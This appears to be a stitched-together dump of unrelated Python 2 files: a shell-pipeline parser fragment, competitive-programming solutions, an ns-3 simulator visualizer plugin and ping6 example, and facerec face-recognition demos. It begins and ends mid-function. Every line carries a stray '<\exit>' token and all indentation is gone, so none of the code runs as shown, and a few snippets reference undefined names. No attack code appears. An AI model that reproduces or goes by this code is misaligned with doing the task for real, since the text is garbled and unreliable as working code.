f.close()<\exit>
files_to_close = []<\exit>
if this_retval == 0:<\exit>
if verbose:<\exit>
print "%s: exit code %i (|| is short-circuited)" % (' '.join(piped_commands_display), retval)<\exit>
return this_retval<\exit>
if verbose:<\exit>
print "%s: exit code %i (|| proceeds)" % (' '.join(piped_commands_display), retval)<\exit>
state = BEGIN<\exit>
piped_commands = []<\exit>
piped_commands_display = []<\exit>
elif isinstance(next_node, And):<\exit>
try:<\exit>
this_retval = self._exec_piped_commands(piped_commands)<\exit>
finally:<\exit>
for f in files_to_close:<\exit>
if f is not dev_null:<\exit>
f.close()<\exit>
files_to_close = []<\exit>
if this_retval != 0:<\exit>
if verbose:<\exit>
print "%s: exit code %i (&& is short-circuited)" % (' '.join(piped_commands_display), retval)<\exit>
return this_retval<\exit>
if verbose:<\exit>
print "%s: exit code %i (&& proceeds)" % (' '.join(piped_commands_display), retval)<\exit>
state = BEGIN<\exit>
piped_commands = []<\exit>
piped_commands_display = []<\exit>
def _main():<\exit>
pipeline = Pipeline()<\exit>
pipeline.parse('./foo.py 2>&1 < xxx | cat && ls')<\exit>
print pipeline.run()<\exit>
if __name__ == '__main__':<\exit>
_main()<\exit>
import collections<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
d = collections.defaultdict(int)<\exit>
lst = list(cipher)<\exit>
n = len(lst)<\exit>
for i in xrange(n):<\exit>
for l in xrange(1, n - i + 1):<\exit>
sub = lst[i: i + l]<\exit>
sub.sort()<\exit>
d["".join(sub)] += 1<\exit>
s = 0<\exit>
for v in d.values():<\exit>
s += v * (v - 1) / 2<\exit>
return s<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
f = [0 for _ in xrange(N + 1)]<\exit>
for i in xrange(1, N + 1):<\exit>
f[i] = f[i - 1] + A[i - 1]<\exit>
for i in xrange(N):<\exit>
if f[i] == f[N] - f[i + 1]:<\exit>
return "YES"<\exit>
return "NO"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
B = cipher<\exit>
N = len(B)<\exit>
dp = [[0, 0] for _ in xrange(N + 1)]<\exit>
LOW = 0<\exit>
HIGH = 1<\exit>
for i in xrange(2, N + 1):<\exit>
dp[i][LOW] = max(dp[i - 1][LOW], dp[i - 1][HIGH] + abs(1 - B[i - 2]))<\exit>
dp[i][HIGH] = max(dp[i - 1][HIGH], dp[i - 1][LOW] + abs(B[i - 1] - 1))<\exit>
return str(max(dp[-1][LOW], dp[-1][HIGH]))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import math<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N = cipher<\exit>
if N % 2 == 1:<\exit>
return 0<\exit>
cnt = 0<\exit>
i = 1<\exit>
sq = math.sqrt(N)<\exit>
while i <= sq:<\exit>
if N % i == 0:<\exit>
if i % 2 == 0:<\exit>
cnt += 1<\exit>
other = N / i<\exit>
if other != i and other % 2 == 0:<\exit>
cnt += 1<\exit>
i += 1<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = int(f.readline().strip())<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, lst = cipher<\exit>
for i in xrange(N):<\exit>
for j in xrange(i + 1, N):<\exit>
if self.gcd(lst[i], lst[j]) == 1:<\exit>
return "YES"<\exit>
return "NO"<\exit>
def gcd(self, a, b):<\exit>
while b:<\exit>
a, b = b, a % b<\exit>
return a<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
lst = map(int, f.readline().strip().split(' '))<\exit>
cipher = (N, lst)<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A, P, Q = cipher<\exit>
A.sort()<\exit>
gmax = -1 << 32<\exit>
M = -1<\exit>
if P <= A[0] and gmax < A[0] - P:<\exit>
gmax = A[0] - P<\exit>
M = P<\exit>
if Q >= A[-1] and gmax < Q - A[-1]:<\exit>
gmax = Q - A[-1]<\exit>
M = Q<\exit>
for i in xrange(1, len(A)):<\exit>
max_cnd = (A[i] - A[i - 1]) / 2<\exit>
if gmax < max_cnd:<\exit>
M_cnd = (A[i] + A[i - 1]) / 2<\exit>
if P <= M_cnd <= Q:<\exit>
gmax = max_cnd<\exit>
M = M_cnd<\exit>
else:<\exit>
if M_cnd > Q and A[i - 1] <= Q <= A[i]:<\exit>
max_cnd = min(abs(A[i] - Q), abs(A[i - 1] - Q))<\exit>
if gmax < max_cnd:<\exit>
gmax = max_cnd<\exit>
M = Q<\exit>
if M_cnd < P and A[i - 1] <= P <= A[i]:<\exit>
max_cnd = min(abs(A[i] - P), abs(A[i - 1] - P))<\exit>
if gmax < max_cnd:<\exit>
gmax = max_cnd<\exit>
M = P<\exit>
return M<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
lst = map(int, f.readline().strip().split(" "))<\exit>
P, Q = map(int, f.readline().strip().split(" "))<\exit>
cipher = lst, P, Q<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import math<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
L, S1, S2, qs = cipher<\exit>
v = abs(S1 - S2) / math.sqrt(2)<\exit>
rets = []<\exit>
for q in qs:<\exit>
t = (L - math.sqrt(q)) / v<\exit>
rets.append(t)<\exit>
return "\n".join(map(lambda x: "%f" % x, rets))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
L, S1, S2 = map(int, f.readline().strip().split(' '))<\exit>
q = int(f.readline().strip())<\exit>
qs = []<\exit>
for t in xrange(q):<\exit>
qs.append(int(f.readline().strip()))<\exit>
cipher = L, S1, S2, qs<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
hm = {}<\exit>
cnt = 0<\exit>
for ind, val in enumerate(cipher):<\exit>
if val in hm:<\exit>
cnt += 2 * len(hm[val])<\exit>
hm[val].append(ind)<\exit>
else:<\exit>
hm[val] = [ind]<\exit>
return cnt<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = f.readline().strip()<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
MOD = 10 ** 9 + 7<\exit>
import math<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, M = cipher<\exit>
return math.factorial(N + M - 1) / math.factorial(N) / math.factorial(M - 1) % MOD<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, N):<\exit>
for i in xrange(N / 3 * 3, -1, -3):<\exit>
if (N - i) % 5 == 0:<\exit>
return "5" * i + "3" * (N - i)<\exit>
return "-1"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = int(f.readline().strip())<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, K, Q, A, q = cipher<\exit>
result = []<\exit>
for i in q:<\exit>
result.append(A[(i - K) % N])<\exit>
return "\n".join(map(str, result))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N, K, Q = map(int, f.readline().strip().split(' '))<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
q = []<\exit>
for i in xrange(Q):<\exit>
q.append(int(f.readline().strip()))<\exit>
cipher = N, K, Q, A, q<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import gobject<\exit>
import gtk<\exit>
import ns.core<\exit>
import ns.network<\exit>
import ns.visualizer<\exit>
from visualizer.base import InformationWindow<\exit>
from visualizer.higcontainer import HIGContainer<\exit>
from kiwi.ui.objectlist import ObjectList, Column<\exit>
class ShowLastPackets(InformationWindow):<\exit>
class PacketList(gtk.ScrolledWindow):<\exit>
(<\exit>
COLUMN_TIME,<\exit>
COLUMN_INTERFACE,<\exit>
COLUMN_SIZE,<\exit>
COLUMN_CONTENTS,<\exit>
) = range(4)<\exit>
def __init__(self):<\exit>
super(ShowLastPackets.PacketList, self).__init__()<\exit>
self.set_properties(hscrollbar_policy=gtk.POLICY_AUTOMATIC,<\exit>
vscrollbar_policy=gtk.POLICY_AUTOMATIC)<\exit>
self.table_model = gtk.ListStore(*([str]*4))<\exit>
treeview = gtk.TreeView(self.table_model)<\exit>
treeview.show()<\exit>
self.add(treeview)<\exit>
def add_column(descr, colid):<\exit>
column = gtk.TreeViewColumn(descr, gtk.CellRendererText(), text=colid)<\exit>
treeview.append_column(column)<\exit>
add_column("Time", self.COLUMN_TIME)<\exit>
add_column("Interface", self.COLUMN_INTERFACE)<\exit>
add_column("Size", self.COLUMN_SIZE)<\exit>
add_column("Contents", self.COLUMN_CONTENTS)<\exit>
def update(self, node, packet_list):<\exit>
self.table_model.clear()<\exit>
for sample in packet_list:<\exit>
tree_iter = self.table_model.append()<\exit>
if sample.device is None:<\exit>
interface_name = "(unknown)"<\exit>
else:<\exit>
interface_name = ns.core.Names.FindName(sample.device)<\exit>
if not interface_name:<\exit>
interface_name = "(interface %i)" % sample.device.GetIfIndex()<\exit>
self.table_model.set(tree_iter,<\exit>
self.COLUMN_TIME, str(sample.time.GetSeconds()),<\exit>
self.COLUMN_INTERFACE, interface_name,<\exit>
self.COLUMN_SIZE, str(sample.packet.GetSize ()),<\exit>
self.COLUMN_CONTENTS, str(sample.packet)<\exit>
)<\exit>
def __init__(self, visualizer, node_index):<\exit>
InformationWindow.__init__(self)<\exit>
self.win = gtk.Dialog(parent=visualizer.window,<\exit>
flags=gtk.DIALOG_DESTROY_WITH_PARENT|gtk.DIALOG_NO_SEPARATOR,<\exit>
buttons=(gtk.STOCK_CLOSE, gtk.RESPONSE_CLOSE))<\exit>
self.win.connect("response", self._response_cb)<\exit>
self.win.set_title("Last packets for node %i" % node_index)<\exit>
self.visualizer = visualizer<\exit>
self.viz_node = visualizer.get_node(node_index)<\exit>
self.node = ns.network.NodeList.GetNode(node_index)<\exit>
def smart_expand(expander, vbox):<\exit>
if expander.get_expanded():<\exit>
vbox.set_child_packing(expander, expand=True, fill=True, padding=0, pack_type=gtk.PACK_START)<\exit>
else:<\exit>
vbox.set_child_packing(expander, expand=False, fill=False, padding=0, pack_type=gtk.PACK_START)<\exit>
main_hbox = gtk.HBox(False, 4)<\exit>
main_hbox.show()<\exit>
main_vbox = gtk.VBox(False, 4)<\exit>
main_vbox.show()<\exit>
self.win.vbox.add(main_hbox)<\exit>
main_hbox.add(main_vbox)<\exit>
self.tx_list = self.PacketList()<\exit>
self.tx_list.show()<\exit>
group = gtk.Expander("Last transmitted packets")<\exit>
group.show()<\exit>
group.add(self.tx_list)<\exit>
main_vbox.pack_start(group, expand=False, fill=False)<\exit>
group.connect_after("activate", smart_expand, main_vbox)<\exit>
self.rx_list = self.PacketList()<\exit>
self.rx_list.show()<\exit>
group = gtk.Expander("Last received packets")<\exit>
group.show()<\exit>
group.add(self.rx_list)<\exit>
main_vbox.pack_start(group, expand=False, fill=False)<\exit>
group.connect_after("activate", smart_expand, main_vbox)<\exit>
self.drop_list = self.PacketList()<\exit>
self.drop_list.show()<\exit>
group = gtk.Expander("Last dropped packets")<\exit>
group.show()<\exit>
group.add(self.drop_list)<\exit>
main_vbox.pack_start(group, expand=False, fill=False)<\exit>
group.connect_after("activate", smart_expand, main_vbox)<\exit>
self.packet_capture_options = ns.visualizer.PyViz.PacketCaptureOptions()<\exit>
self.packet_capture_options.numLastPackets = 100<\exit>
packet_filter_vbox = gtk.VBox(False, 4)<\exit>
packet_filter_vbox.show()<\exit>
main_hbox.add(packet_filter_vbox)<\exit>
sel_buttons_box = gtk.HButtonBox()<\exit>
sel_buttons_box.show()<\exit>
packet_filter_vbox.pack_start(sel_buttons_box, False, False, 4)<\exit>
select_all_button = gobject.new(gtk.Button, label="Sel. All", visible=True)<\exit>
select_none_button = gobject.new(gtk.Button, label="Sel. None", visible=True)<\exit>
sel_buttons_box.add(select_all_button)<\exit>
sel_buttons_box.add(select_none_button)<\exit>
self.packet_filter_widget = ObjectList([<\exit>
Column('selected', title="Sel.", data_type=bool, editable=True),<\exit>
Column('name', title="Header"),<\exit>
], sortable=True)<\exit>
self.packet_filter_widget.show()<\exit>
packet_filter_vbox.pack_start(self.packet_filter_widget, True, True, 4)<\exit>
class TypeIdConfig(object):<\exit>
__slots__ = ['name', 'selected', 'typeid']<\exit>
self.packet_filter_list = []<\exit>
Header = ns.core.TypeId.LookupByName("ns3::Header")<\exit>
Trailer = ns.core.TypeId.LookupByName("ns3::Trailer")<\exit>
for typeid_i in range(ns.core.TypeId.GetRegisteredN()):<\exit>
typeid = ns.core.TypeId.GetRegistered(typeid_i)<\exit>
typeid_tmp = typeid<\exit>
type_is_good = False<\exit>
while 1:<\exit>
if typeid_tmp == Header or typeid_tmp == Trailer:<\exit>
type_is_good = True<\exit>
break<\exit>
if typeid_tmp.HasParent():<\exit>
typeid_tmp = typeid_tmp.GetParent()<\exit>
else:<\exit>
break<\exit>
if not type_is_good:<\exit>
continue<\exit>
if typeid in [Header, Trailer]:<\exit>
continue<\exit>
c = TypeIdConfig()<\exit>
c.selected = True<\exit>
c.name = typeid.GetName()<\exit>
c.typeid = typeid<\exit>
self.packet_filter_list.append(c)<\exit>
self.packet_filter_widget.add_list(self.packet_filter_list)<\exit>
def update_capture_options():<\exit>
if self.op_AND_button.props.active:<\exit>
self.packet_capture_options.mode = ns.visualizer.PyViz.PACKET_CAPTURE_FILTER_HEADERS_AND<\exit>
else:<\exit>
self.packet_capture_options.mode = ns.visualizer.PyViz.PACKET_CAPTURE_FILTER_HEADERS_OR<\exit>
self.packet_capture_options.numLastPackets = 100<\exit>
self.packet_capture_options.headers = [c.typeid for c in self.packet_filter_list if c.selected]<\exit>
self.visualizer.simulation.lock.acquire()<\exit>
try:<\exit>
self.visualizer.simulation.sim_helper.SetPacketCaptureOptions(<\exit>
self.node.GetId(), self.packet_capture_options)<\exit>
finally:<\exit>
self.visualizer.simulation.lock.release()<\exit>
def sel_all_cb(bt):<\exit>
for c in self.packet_filter_list:<\exit>
c.selected = True<\exit>
self.packet_filter_widget.refresh()<\exit>
update_capture_options()<\exit>
def sel_none_cb(bt):<\exit>
for c in self.packet_filter_list:<\exit>
c.selected = False<\exit>
self.packet_filter_widget.refresh()<\exit>
update_capture_options()<\exit>
select_all_button.connect("clicked", sel_all_cb)<\exit>
select_none_button.connect("clicked", sel_none_cb)<\exit>
op_buttons_box = gtk.HButtonBox()<\exit>
op_buttons_box.show()<\exit>
packet_filter_vbox.pack_start(op_buttons_box, False, False, 4)<\exit>
self.op_AND_button = gobject.new(gtk.RadioButton, label="AND", visible=True)<\exit>
self.op_OR_button = gobject.new(gtk.RadioButton, label="OR", visible=True, group=self.op_AND_button)<\exit>
op_buttons_box.add(self.op_AND_button)<\exit>
op_buttons_box.add(self.op_OR_button)<\exit>
self.op_OR_button.props.active = True<\exit>
self.op_AND_button.connect("toggled", lambda b: update_capture_options())<\exit>
def cell_edited(l, obj, attribute):<\exit>
update_capture_options()<\exit>
self.packet_filter_widget.connect("cell-edited", cell_edited)<\exit>
update_capture_options()<\exit>
self.visualizer.add_information_window(self)<\exit>
self.win.set_default_size(600, 300)<\exit>
self.win.show()<\exit>
def _response_cb(self, win, response):<\exit>
self.win.destroy()<\exit>
self.visualizer.remove_information_window(self)<\exit>
def update(self):<\exit>
last_packets = self.visualizer.simulation.sim_helper.GetLastPackets(self.node.GetId())<\exit>
self.tx_list.update(self.node, last_packets.lastTransmittedPackets)<\exit>
self.rx_list.update(self.node, last_packets.lastReceivedPackets)<\exit>
self.drop_list.update(self.node, last_packets.lastDroppedPackets)<\exit>
def populate_node_menu(viz, node, menu):<\exit>
menu_item = gtk.MenuItem("Show Last Packets")<\exit>
menu_item.show()<\exit>
def _show_it(dummy_menu_item):<\exit>
ShowLastPackets(viz, node.node_index)<\exit>
menu_item.connect("activate", _show_it)<\exit>
menu.add(menu_item)<\exit>
def register(viz):<\exit>
viz.connect("populate-node-menu", populate_node_menu)<\exit>
import ns.applications<\exit>
import ns.core<\exit>
import ns.csma<\exit>
import ns.internet<\exit>
import ns.network<\exit>
def main(argv):<\exit>
cmd = ns.core.CommandLine();<\exit>
cmd.Parse(argv);<\exit>
print "Create nodes"<\exit>
n0 = ns.network.Node();<\exit>
r = ns.network.Node();<\exit>
n1 = ns.network.Node();<\exit>
net1 = ns.network.NodeContainer();<\exit>
net1.Add(n0);<\exit>
net1.Add(r);<\exit>
net2 = ns.network.NodeContainer();<\exit>
net2.Add(r);<\exit>
net2.Add(n1);<\exit>
all = ns.network.NodeContainer();<\exit>
all.Add(n0);<\exit>
all.Add(r);<\exit>
all.Add(n1);<\exit>
internetv6 = ns.internet.InternetStackHelper();<\exit>
internetv6.Install(all);<\exit>
csma = ns.csma.CsmaHelper();<\exit>
csma.SetChannelAttribute("DataRate", ns.network.DataRateValue(ns.network.DataRate(5000000)));<\exit>
csma.SetChannelAttribute("Delay", ns.core.TimeValue(ns.core.MilliSeconds(2)));<\exit>
d1 = csma.Install(net1);<\exit>
d2 = csma.Install(net2);<\exit>
print "Addressing"<\exit>
ipv6 = ns.internet.Ipv6AddressHelper();<\exit>
ipv6.NewNetwork(ns.network.Ipv6Address("2001:1::"), ns.network.Ipv6Prefix(64));<\exit>
i1 = ipv6.Assign(d1);<\exit>
i1.SetRouter(1, True);<\exit>
ipv6.NewNetwork(ns.network.Ipv6Address("2001:2::"), ns.network.Ipv6Prefix(64));<\exit>
i2 = ipv6.Assign(d2);<\exit>
i2.SetRouter(0, True);<\exit>
print "Application"<\exit>
packetSize = 1024;<\exit>
maxPacketCount = 5;<\exit>
interPacketInterval = ns.core.Seconds(1.);<\exit>
ping6 = ns.applications.Ping6Helper();<\exit>
ping6.SetLocal(i1.GetAddress(0, 1));<\exit>
ping6.SetRemote(i2.GetAddress(1, 1));<\exit>
ping6.SetAttribute("MaxPackets", ns.core.UintegerValue(maxPacketCount));<\exit>
ping6.SetAttribute("Interval", ns.core.TimeValue(interPacketInterval));<\exit>
ping6.SetAttribute("PacketSize", ns.core.UintegerValue(packetSize));<\exit>
apps = ping6.Install(ns.network.NodeContainer(net1.Get(0)));<\exit>
apps.Start(ns.core.Seconds(2.0));<\exit>
apps.Stop(ns.core.Seconds(20.0));<\exit>
print "Tracing"<\exit>
ascii = ns.network.AsciiTraceHelper()<\exit>
csma.EnableAsciiAll(ascii.CreateFileStream("simple-routing-ping6.tr"))<\exit>
csma.EnablePcapAll("simple-routing-ping6", True)<\exit>
ns.core.Simulator.Run()<\exit>
ns.core.Simulator.Destroy()<\exit>
if __name__ == '__main__':<\exit>
import sys<\exit>
main(sys.argv)<\exit>
import sys, os<\exit>
sys.path.append("../..")<\exit>
from facerec.feature import Fisherfaces, SpatialHistogram, Identity<\exit>
from facerec.distance import EuclideanDistance, ChiSquareDistance<\exit>
from facerec.classifier import NearestNeighbor<\exit>
from facerec.model import PredictableModel<\exit>
from facerec.validation import KFoldCrossValidation<\exit>
from facerec.visual import subplot<\exit>
from facerec.util import minmax_normalize<\exit>
from facerec.serialization import save_model, load_model<\exit>
import numpy as np<\exit>
try:<\exit>
from PIL import Image<\exit>
except ImportError:<\exit>
import Image<\exit>
import matplotlib.cm as cm<\exit>
import logging<\exit>
import matplotlib.pyplot as plt<\exit>
import matplotlib.cm as cm<\exit>
from facerec.lbp import LPQ, ExtendedLBP<\exit>
def read_images(path, sz=None):<\exit>
c = 0<\exit>
X,y = [], []<\exit>
for dirname, dirnames, filenames in os.walk(path):<\exit>
for subdirname in dirnames:<\exit>
subject_path = os.path.join(dirname, subdirname)<\exit>
for filename in os.listdir(subject_path):<\exit>
try:<\exit>
im = Image.open(os.path.join(subject_path, filename))<\exit>
im = im.convert("L")<\exit>
if (sz is not None):<\exit>
im = im.resize(self.sz, Image.ANTIALIAS)<\exit>
X.append(np.asarray(im, dtype=np.uint8))<\exit>
y.append(c)<\exit>
except IOError, (errno, strerror):<\exit>
print "I/O error({0}): {1}".format(errno, strerror)<\exit>
except:<\exit>
print "Unexpected error:", sys.exc_info()[0]<\exit>
raise<\exit>
c = c+1<\exit>
return [X,y]<\exit>
if __name__ == "__main__":<\exit>
out_dir = None<\exit>
if len(sys.argv) < 2:<\exit>
print "USAGE: facerec_demo.py </path/to/images>"<\exit>
sys.exit()<\exit>
[X,y] = read_images(sys.argv[1])<\exit>
handler = logging.StreamHandler(sys.stdout)<\exit>
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')<\exit>
handler.setFormatter(formatter)<\exit>
logger = logging.getLogger("facerec")<\exit>
logger.addHandler(handler)<\exit>
logger.setLevel(logging.DEBUG)<\exit>
feature = Fisherfaces()<\exit>
classifier = NearestNeighbor(dist_metric=EuclideanDistance(), k=1)<\exit>
my_model = PredictableModel(feature=feature, classifier=classifier)<\exit>
my_model.compute(X, y)<\exit>
save_model('model.pkl', my_model)<\exit>
model = load_model('model.pkl')<\exit>
E = []<\exit>
for i in xrange(min(model.feature.eigenvectors.shape[1], 16)):<\exit>
e = model.feature.eigenvectors[:,i].reshape(X[0].shape)<\exit>
E.append(minmax_normalize(e,0,255, dtype=np.uint8))<\exit>
subplot(title="Fisherfaces", images=E, rows=4, cols=4, sptitle="Fisherface", colormap=cm.jet, filename="fisherfaces.png")<\exit>
cv = KFoldCrossValidation(model, k=10)<\exit>
cv.validate(X, y)<\exit>
cv.print_results()<\exit>
import logging<\exit>
import cv2<\exit>
from helper.common import *<\exit>
from helper.video import *<\exit>
import sys<\exit>
sys.path.append("../..")<\exit>
from facerec.model import PredictableModel<\exit>
from facerec.feature import Fisherfaces<\exit>
from facerec.distance import EuclideanDistance<\exit>
from facerec.classifier import NearestNeighbor<\exit>
from facerec.validation import KFoldCrossValidation<\exit>
from facerec.serialization import save_model, load_model<\exit>
from facedet.detector import CascadedDetector<\exit>
class ExtendedPredictableModel(PredictableModel):<\exit>
def __init__(self, feature, classifier, image_size, subject_names):<\exit>
PredictableModel.__init__(self, feature=feature, classifier=classifier)<\exit>
self.image_size = image_size<\exit>
self.subject_names = subject_names<\exit>
def get_model(image_size, subject_names):<\exit>
feature = Fisherfaces()<\exit>
classifier = NearestNeighbor(dist_metric=EuclideanDistance(), k=1)<\exit>
return ExtendedPredictableModel(feature=feature, classifier=classifier, image_size=image_size, subject_names=subject_names)<\exit>
def read_subject_names(path):<\exit>
folder_names = []<\exit>
for dirname, dirnames, filenames in os.walk(path):<\exit>
for subdirname in dirnames:<\exit>
folder_names.append(subdirname)<\exit>
return folder_names<\exit>
def read_images(path, image_size=None):<\exit>
c = 0<\exit>
X = []<\exit>
y = []<\exit>
folder_names = []<\exit>
for dirname, dirnames, filenames in os.walk(path):<\exit>
for subdirname in dirnames:<\exit>
folder_names.append(subdirname)<\exit>
subject_path = os.path.join(dirname, subdirname)<\exit>
for filename in os.listdir(subject_path):<\exit>
try:<\exit>
im = cv2.imread(os.path.join(subject_path, filename), cv2.IMREAD_GRAYSCALE)<\exit>
if (image_size is not None):<\exit>
im = cv2.resize(im, image_size)<\exit>
X.append(np.asarray(im, dtype=np.uint8))<\exit>
y.append(c)<\exit>
except IOError, (errno, strerror):<\exit>
print "I/O error({0}): {1}".format(errno, strerror)<\exit>
except:<\exit>
print "Unexpected error:", sys.exc_info()[0]<\exit>
raise<\exit>
c = c+1<\exit>
return [X,y,folder_names]<\exit>
class App(object):<\exit>
def __init__(self, model, camera_id, cascade_filename):<\exit>
self.model = model<\exit>
self.detector = CascadedDetector(cascade_fn=cascade_filename, minNeighbors=5, scaleFactor=1.1)<\exit>
self.cam = create_capture(camera_id)<\exit>
def run(self):<\exit>
while True:<\exit>
ret, frame = self.cam.read()<\exit>
img = cv2.resize(frame, (frame.shape[1]/2, frame.shape[0]/2), interpolation = cv2.INTER_CUBIC)<\exit>
imgout = img.copy()<\exit>
for i,r in enumerate(self.detector.detect(img)):<\exit>
x0,y0,x1,y1 = r<\exit>
face = img[y0:y1, x0:x1]<\exit>
face = cv2.cvtColor(face,cv2.COLOR_BGR2GRAY)<\exit>
face = cv2.resize(face, self.model.image_size, interpolation = cv2.INTER_CUBIC)<\exit>
prediction = self.model.predict(face)[0]<\exit>
cv2.rectangle(imgout, (x0,y0),(x1,y1),(0,255,0),2)<\exit>
draw_str(imgout, (x0-20,y0-20), self.model.subject_names[prediction])<\exit>
cv2.imshow('videofacerec', imgout)<\exit>
ch = cv2.waitKey(10)<\exit>
if ch == 27:<\exit>
break<\exit>
if __name__ == '__main__':<\exit>
from optparse import OptionParser<\exit>
usage = "usage: %prog [options] model_filename"<\exit>
parser = OptionParser(usage=usage)<\exit>
parser.add_option("-r", "--resize", action="store", type="string", dest="size", default="100x100",<\exit>
help="Resizes the given dataset to a given size in format [width]x[height] (default: 100x100).")<\exit>
parser.add_option("-v", "--validate", action="store", dest="numfolds", type="int", default=None,<\exit>
help="Performs a k-fold cross validation on the dataset, if given (default: None).")<\exit>
parser.add_option("-t", "--train", action="store", dest="dataset", type="string", default=None,<\exit>
help="Trains the model on the given dataset.")<\exit>
parser.add_option("-i", "--id", action="store", dest="camera_id", type="int", default=0,<\exit>
help="Sets the Camera Id to be used (default: 0).")<\exit>
parser.add_option("-c", "--cascade", action="store", dest="cascade_filename", default="haarcascade_frontalface_alt2.xml",<\exit>
help="Sets the path to the Haar Cascade used for the face detection part (default: haarcascade_frontalface_alt2.xml).")<\exit>
parser.print_help()<\exit>
print "Press [ESC] to exit the program!"<\exit>
print "Script output:"<\exit>
(options, args) = parser.parse_args()<\exit>
if len(args) == 0:<\exit>
print "[Error] No prediction model was given."<\exit>
sys.exit()<\exit>
model_filename = args[0]<\exit>
if (options.dataset is None) and (not os.path.exists(model_filename)):<\exit>
print "[Error] No prediction model found at '%s'." % model_filename<\exit>
sys.exit()<\exit>
if not os.path.exists(options.cascade_filename):<\exit>
print "[Error] No Cascade File found at '%s'." % options.cascade_filename<\exit>
sys.exit()<\exit>
try:<\exit>
image_size = (int(options.size.split("x")[0]), int(options.size.split("x")[1]))<\exit>
except:<\exit>
print "[Error] Unable to parse the given image size '%s'. Please pass it in the format [width]x[height]!" % options.size<\exit>
sys.exit()<\exit>
if options.dataset:<\exit>
if not os.path.exists(options.dataset):<\exit>
print "[Error] No dataset found at '%s'." % dataset_path<\exit>
sys.exit()<\exit>
print "Loading dataset..."<\exit>
[images, labels, subject_names] = read_images(options.dataset, image_size)<\exit>
list_of_labels = list(xrange(max(labels)+1))<\exit>
subject_dictionary = dict(zip(list_of_labels, subject_names))<\exit>
model = get_model(image_size=image_size, subject_names=subject_dictionary)<\exit>
if options.numfolds:<\exit>
print "Validating model with %s folds..." % options.numfolds<\exit>
handler = logging.StreamHandler(sys.stdout)<\exit>
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')<\exit>
handler.setFormatter(formatter)<\exit>
logger = logging.getLogger("facerec")<\exit>
logger.addHandler(handler)<\exit>
logger.setLevel(logging.DEBUG)<\exit>
crossval = KFoldCrossValidation(model, k=options.numfolds)<\exit>
crossval.validate(images, labels)<\exit>
crossval.print_results()<\exit>
print "Computing the model..."<\exit>
model.compute(images, labels)<\exit>
print "Saving the model..."<\exit>
save_model(model_filename, model)<\exit>
else:<\exit>
print "Loading the model..."<\exit>
model = load_model(model_filename)<\exit>
if not isinstance(model, ExtendedPredictableModel):<\exit>
print "[Error] The given model is not of type '%s'." % "ExtendedPredictableModel"<\exit>
sys.exit()<\exit>
print "Starting application..."<\exit>
App(model=model,<\exit>
camera_id=options.camera_id,<\exit>
cascade_filename=options.cascade_filename).run()<\exit>
class Solution:<\exit>
def singleNumberIII(self, A):<\exit>
bits = 0<\exit>
for a in A:<\exit>
bits ^= a<\exit>
